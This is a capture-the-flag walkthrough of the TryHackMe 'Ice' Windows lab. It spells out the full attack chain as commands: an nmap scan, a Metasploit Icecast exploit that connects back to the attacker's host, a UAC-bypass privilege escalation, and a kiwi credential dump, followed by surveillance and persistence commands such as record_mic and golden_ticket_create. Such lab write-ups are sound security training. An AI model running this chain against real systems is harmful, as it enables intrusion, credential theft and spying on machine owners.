# Target: Ice

**Platform:** TryHackMe
[Ice on TryHackMe](https://tryhackme.com/room/ice)

| Target Name | IP Address | OS | Difficulty |
| --- | --- | --- | --- |
| Ice | 10.66.158.159 | Windows | Easy |

---

## Phase 1: Reconnaissance & Enumeration

I started my reconnaissance by using the `nmap` command on the machine to check what ports were open. I used a specified flag `-sV` to identify the system version running on each port and to scan all of them by using flag `-p-`:

**Nmap Scan:**

```bash
sudo nmap -sS -sV -p- -vv -T4 --min-rate 1000 10.66.158.159

```

```
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 126 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Service
5357/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http          syn-ack ttl 126 Icecast streaming media server
49152/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
9153/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49158/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49159/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49160/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

The scan showed a list of open ports and system versions. I noticed that the Microsoft Remote Desktop (`MSRDP`) service was open on port 3389, represented by `ms-wbt-server`. Additionally, I found the Icecast streaming media server running on port 8000, and the scan identified the host name as `DARK-PC`.

## Phase 2: Initial Foothold (Gaining Access)

After some research, I visited CVEDetails and confirmed that Icecast has a critical vulnerability, identified as CVE-2004-1561 with an Impact Score of 6.4. To exploit this, I launched Metasploit using `msfconsole` and searched for Icecast modules.

**Searching and Selecting Exploit in Metasploit:**

```bash
search icecast
use exploit/windows/http/icecast_header

```

I checked the required settings using `show options` and noticed `RHOSTS` was empty, so I set it to the target machine's IP address. I also changed the `LHOST` to my VPN IP address (`192.168.138.137`) to ensure the exploit could connect back to me.

**Exploit Configuration and Execution:**

```bash
set RHOSTS 10.66.158.159
set LHOST 192.168.138.137
exploit

```

After launching the attack, a Meterpreter session started running, confirming I successfully gained access to the machine.

## Phase 3: Privilege Escalation & Post-Exploitation

Once I had access, I ran `getuid` and found that the machine was running under the user `Dark-PC\Dark`. I then used the `sysinfo` command, which revealed the system was running Windows 7 (6.1 Build 7601, Service Pack 1) with an x64 architecture.

To find vulnerabilities for privilege escalation, I used a built-in Meterpreter script:

**Running Local Exploit Suggester:**

```bash
run post/multi/recon/local_exploit_suggester

```

The output showed several vulnerabilities, and I decided to use the `bypassuac_eventvwr` exploit. I backgrounded my current session to get the session number (which was 1) and configured the new exploit:

**Configuring Privilege Escalation Exploit:**

```bash
background
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set LHOST 192.168.138.137
run

```

The exploit worked perfectly, spawning another Meterpreter session. I ran `getprivs` and noticed the `SeTakeOwnershipPrivilege` process, which could allow me to take control over the system. I checked running processes using `ps` and migrated my connection to a stable, high-privilege process named `spoolsv.exe`:

**Process Migration & Verifying Privileges:**

```bash
migrate -N spoolsv.exe
getuid

```

```
Server username: NT AUTHORITY\SYSTEM

```

Running `getuid` confirmed I now had `NT AUTHORITY\SYSTEM` privileges, meaning I had admin access. I then loaded the `kiwi` tool to dump credentials.

**Dumping Credentials with Kiwi:**

```bash
load kiwi
creds_all

```

By using the `creds_all` command, which shows all authentication data, I obtained the password `Password01` for the user `Dark`.

During further post-exploitation, I explored other commands:

* `hashdump`: To extract password hashes for Administrator, Dark, and Guest.
* `screenshare`: To view the remote desktop in a browser in real-time.
* `record_mic`: To capture audio from the attached microphone.
* `timestomp`: To modify file timestamps (though not recommended for real defensive engagements).
* `golden_ticket_create`: To generate a golden ticket for easy authentication.
* `run post/windows/manage/enable_rdp`: To enable remote desktop via Metasploit.

## Conclusion & Takeaways

**Summary:** The entry to this machine was achieved by exploiting a vulnerability in the Icecast streaming service (CVE-2004-1561). Following the initial foothold, privileges were escalated using a UAC bypass vulnerability (`bypassuac_eventvwr`) to become the super user (`NT AUTHORITY\SYSTEM`).

**What I Learned:** * **Exploitation Frameworks:** Using Metasploit modules to search for and configure exploits against vulnerable software like Icecast.

* **Post-Exploitation Enumeration:** Using `local_exploit_suggester` to find potential privilege escalation vectors on older Windows systems.
* **Process Migration:** Moving to stable, privileged processes like `spoolsv.exe` to maintain reliable access and interact safely with tools like Mimikatz/Kiwi.

**Remediation:** This level of access allows an attacker complete control over the system, posing a critical risk. To fix this vulnerability, it is highly recommended to update the system to the newest version.
